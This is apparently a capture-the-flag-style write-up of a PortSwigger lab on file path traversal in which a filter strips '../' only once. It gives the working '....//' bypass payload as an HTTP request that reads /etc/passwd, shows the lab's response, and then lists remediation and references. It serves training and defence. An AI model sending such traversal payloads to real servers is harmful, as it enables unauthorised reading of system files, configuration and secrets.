# File path traversal, traversal sequences stripped non-recursively

**Category:** Path traversal
**Level:** Practitioner
**Mechanism:** Non-recursive stripping bypass (`....//`)
**Lab URL:** https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

---

## Vulnerability

Path traversal in the product-image endpoint: a user-controlled `filename` is used to
read a file from disk. Here a filter tries to block traversal by **stripping** `../`
sequences from the input — but it strips them only **once** (non-recursively), so a
crafted sequence survives the strip and reconstitutes into `../`.

## Reconnaissance & Exploitation

Images load via `GET /image?filename=<name>` (e.g. `filename=8.jpg`). The lab states
the app removes traversal sequences, so a plain `../../../etc/passwd` is cleaned away.
The bypass abuses the fact that the strip runs a single pass: `....//` has an inner
`../` that, once removed, leaves `../` behind.

```
....//   → filter removes the inner "../"   → ../
```

So `....//....//....//etc/passwd` collapses, after one strip pass, into
`../../../etc/passwd` — the payload the filter thought it had neutralised.

```http
GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: 0ad000f2037945548103c58f00350070.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: image/jpeg
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
academy:x:10000:10000::/academy:/bin/bash
...
```

Lab solved — `/etc/passwd` retrieved. The filter's flaw is that it sanitises once and
trusts the result, instead of stripping repeatedly until no sequence remains.

## Impact

Arbitrary file read with the web process's privileges — local account enumeration via
`/etc/passwd`, and the ability to read application source, config, secrets and keys.
The specific lesson is that a sanitising filter that does not loop is worse than none:
it gives a false sense of safety while a single-pass bypass (`....//`) walks straight
through it.

## Remediation

- Do not sanitise by stripping; it is bypassable. Validate the destination instead:
  resolve the full path (`realpath`) and confirm it stays inside the intended base
  directory.
- If sanitising at all, strip **recursively** (loop until the string no longer changes)
  — but canonicalise-and-check is the robust fix, not more stripping.
- Best: don't pass user input into a filesystem path; map an opaque ID to a known file.

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

## Notes

- Pattern: a filter that *removes* bad substrings once can often be defeated by nesting
  the pattern so that removal *creates* it (`....//` → `../`, same idea as `..././`).
- This is the "stripped non-recursively" sibling of the earlier labs: same root cause
  (trusting user input in a path), different defence to bypass.